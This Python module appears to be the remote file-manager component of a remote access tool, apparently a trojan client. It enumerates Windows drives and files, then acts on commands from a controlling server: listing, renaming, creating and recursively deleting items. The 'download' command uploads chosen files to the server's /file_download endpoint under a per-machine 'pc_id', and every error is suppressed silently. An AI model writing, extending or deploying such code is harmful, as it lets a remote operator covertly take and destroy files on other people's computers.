import os
import string
import shutil
from features.curlmanager import CurlManager

class FileManager:
    def __init__(self, cfc_instance=None):
        self.current_directory = "DRIVES://"
        self.cfc_instance = cfc_instance 

    def _list_drives(self):
        drives = []
        for drive in string.ascii_uppercase:
            if os.path.exists(f"{drive}:\\"):
                drives.append(f"{drive}:\\")
        return drives
    
    def change_directory(self, path):
        """Change the current directory"""
        try:
            # Handle special case: going back to drives view
            if path == ".." and self.current_directory == "DRIVES://":
                # Already at root, can't go further back
                return
            
            # Handle going back to drives view from a directory
            if path == ".." and self.current_directory != "DRIVES://":
                parent = os.path.dirname(self.current_directory.rstrip("\\"))
                if parent == "" or parent.endswith(":"):
                    # We're at the root of a drive, go back to drives view
                    self.current_directory = "DRIVES://"
                    return
                else:
                    self.current_directory = parent
                    return
            
            # Handle navigation from drives view to a specific drive
            if self.current_directory == "DRIVES://" and path.endswith(":\\"):
                if os.path.exists(path):
                    self.current_directory = path
                    return
                else:
                    return
            
            # Handle normal directory navigation
            if self.current_directory != "DRIVES://":
                # Resolve the path
                new_path = os.path.abspath(os.path.join(self.current_directory, path))
                
                # Check if path exists and is a directory
                if os.path.exists(new_path) and os.path.isdir(new_path):
                    self.current_directory = new_path
                    return
                else:
                    return
            
            return
        except Exception as e:
            return
    
    def list_files(self):
        """List files in the current directory with name, type, and size"""
        try:
            # Special handling for drives view
            if self.current_directory == "DRIVES://":
                return self._list_drives_view()
            
            if not os.path.exists(self.current_directory):
                return "Error: Current directory does not exist"
            
            files_info = []
            
            # List all items in the directory
            try:
                items = os.listdir(self.current_directory)
            except PermissionError:
                return "Error: Permission denied to list directory"
            
            # Sort items (directories first, then files)
            dirs = []
            files = []
            
            for item in items:
                # Skip hidden and system files/folders
                if self._should_skip_item(item):
                    continue
                    
                item_path = os.path.join(self.current_directory, item)
                try:
                    if os.path.isdir(item_path):
                        dirs.append(item)
                    else:
                        files.append(item)
                except PermissionError:
                    # Handle items we can't access
                    files.append(item)
            
            # Sort directories and files
            dirs.sort(key=str.lower)
            files.sort(key=str.lower)
            
            # Add directories to the list (non-recursive: size of immediate files only)
            for directory in dirs:
                try:
                    dir_path = os.path.join(self.current_directory, directory)
                    try:
                        immediate_size = 0
                        # Use scandir for performance; only sum files directly inside the folder
                        with os.scandir(dir_path) as it:
                            for entry in it:
                                try:
                                    if entry.is_file(follow_symlinks=False):
                                        immediate_size += entry.stat(follow_symlinks=False).st_size
                                except Exception:
                                    # Ignore items we can't stat
                                    pass
                        formatted_size = self._format_file_size(immediate_size)
                    except Exception:
                        formatted_size = "<?>"
                    files_info.append({
                        "name": directory,
                        "type": "DIR",
                        "size": formatted_size
                    })
                except Exception:
                    files_info.append({
                        "name": directory,
                        "type": "DIR",
                        "size": "<?>"
                    })
            
            # Add files to the list
            for file in files:
                file_path = os.path.join(self.current_directory, file)
                try:
                    if os.path.exists(file_path):
                        file_size = os.path.getsize(file_path)
                        files_info.append({
                            "name": file,
                            "type": "FILE",
                            "size": self._format_file_size(file_size)
                        })
                    else:
                        files_info.append({
                            "name": file,
                            "type": "FILE",
                            "size": "None"
                        })
                except Exception:
                    files_info.append({
                        "name": file,
                        "type": "FILE",
                        "size": "None"
                    })
            
            return files_info
        except Exception as e:
            return f"Error listing files: {str(e)}"
    
    def _list_drives_view(self):
        """List all available drives as the root view"""
        try:
            drives = self._list_drives()
            
            files_info = []
            
            for drive in drives:
                try:
                    # Get drive size information
                    total, used, free = shutil.disk_usage(drive)
                    files_info.append({
                        "name": drive,
                        "type": "DIR",
                        "size": self._format_file_size(total)
                    })
                except Exception:
                    files_info.append({
                        "name": drive,
                        "type": "DIR",
                        "size": "None"
                    })
            
            return files_info
        except Exception as e:
            return []
    
    def _should_skip_item(self, item_name):
        """Check if an item should be skipped (hidden/system files)"""
        # Skip items that start with a dot (Unix hidden files)
        if item_name.startswith('.'):
            return True
        
        # Skip Windows system and hidden folders
        system_folders = {
            '$RECYCLE.BIN',
            'System Volume Information',
            'Recovery',
            'hiberfil.sys',
            'pagefile.sys',
            'swapfile.sys',
            '$Recycle.Bin',
            'System Volume Information',
            'Config.Msi',
            'Documents and Settings',
            'ProgramData',
            'Recovery',
            'System Volume Information',
            'Windows.old'
        }
        
        if item_name in system_folders:
            return True
        
        # Skip files that start with $ (Windows system files)
        if item_name.startswith('$'):
            return True
        
        # Skip files that start with ~ (temporary files)
        if item_name.startswith('~'):
            return True
        
        return False

    def _format_file_size(self, size_bytes):
        """Format file size in human readable format"""
        try:
            if size_bytes == 0:
                return "0B"
            
            size_names = ["B", "KB", "MB", "GB", "TB"]
            i = 0
            while size_bytes >= 1024 and i < len(size_names) - 1:
                size_bytes /= 1024.0
                i += 1
            
            if i == 0:
                return f"{int(size_bytes)}{size_names[i]}"
            else:
                return f"{size_bytes:.1f}{size_names[i]}"
        except Exception:
            return "<?>"
    
    def handle_server_request(self, command_data):
        """Handle commands sent from the server"""
        try:
            # Default action is to list files
            action = command_data.get('command', 'list')

            if action == 'list':
                return self.send_to_server(self.list_files())
            elif action == 'cd':
                # Change directory
                path = command_data.get('path', '..')  # Default to go back
                self.change_directory(path)
            elif action == 'rename':
                # Rename a file or directory
                old_name = command_data.get('old_name')
                new_name = command_data.get('new_name')
                if old_name and new_name:
                    self.rename_item(old_name, new_name)
            elif action == 'delete':
                # Delete a file or directory
                name = command_data.get('name')
                if name:
                    self.delete_item(name)
            elif action == 'add':
                # Create a new directory
                name = command_data.get('name')
                item_type = command_data.get('type', 'dir')  # dir or file
                if name:
                    self.create_item(name, item_type)
            elif action == 'download':
                # Download a file
                name = command_data.get('name')
                if name:
                    return self.download_file(name)

            # Send result to server
            self.send_to_server(self.list_files())
            return True
        except Exception as e:
            return False

    def rename_item(self, old_name, new_name):
        """Rename a file or directory"""
        try:
            old_path = os.path.join(self.current_directory, old_name)
            new_path = os.path.join(self.current_directory, new_name)
            
            if not os.path.exists(old_path):
                return
            
            if os.path.exists(new_path):
                return
            
            os.rename(old_path, new_path)
            return
        except Exception as e:
            return

    def delete_item(self, name):
        """Delete a file or directory"""
        try:
            item_path = os.path.join(self.current_directory, name)
            
            if not os.path.exists(item_path):
                return
            
            if os.path.isdir(item_path):
                # Delete directory and all its contents
                shutil.rmtree(item_path)
                return
            else:
                # Delete file
                os.remove(item_path)
                return
        except Exception as e:
            return

    def create_item(self, name, item_type='dir'):
        """Create a new file or directory"""
        try:
            item_path = os.path.join(self.current_directory, name)
            
            if os.path.exists(item_path):
                return
            
            if item_type == 'dir':
                # Create directory
                os.makedirs(item_path)
                return
            else:
                # Create empty file
                with open(item_path, 'w') as f:
                    pass
                return
        except Exception as e:
            return

    def download_file(self, name):
        """Download a file by sending it directly to the server using post_file"""
        try:
            file_path = os.path.join(self.current_directory, name)
            
            if not os.path.exists(file_path):
                return False
            
            if os.path.isdir(file_path):
                return False  # Can't download directories
            
            # Send the file directly to the server using post_file
            try:
                if not self.cfc_instance:
                    return False
                
                # Prepare the URL for the file download endpoint
                url = f"{self.cfc_instance.base_url}/file_download?pc_id={self.cfc_instance.client_data['pc_id']}&filename={name}"
                
                # Create CurlManager instance
                curl = CurlManager()
                curl.set_headers(self.cfc_instance.headers)
                
                # Send the file using post_file method
                curl.post_file(
                    url=url,
                    file_path=file_path,
                    field_name='file'
                )
                return True
            except Exception as e:
                return False
        except Exception as e:
            return False

    def send_to_server(self, data):
        """Send file manager data to the server"""
        try:
            if not self.cfc_instance:
                return False
            
            # Prepare the URL for the file manager endpoint
            url = f"{self.cfc_instance.base_url}/file_manager?pc_id={self.cfc_instance.client_data['pc_id']}"
            
            # Create CurlManager instance
            curl = CurlManager()
            curl.set_headers(self.cfc_instance.headers)
            
            # Send the data as JSON
            curl.post(
                url=url,
                json={"data": data},
                parse_json=True
            )
        except Exception as e:
            return False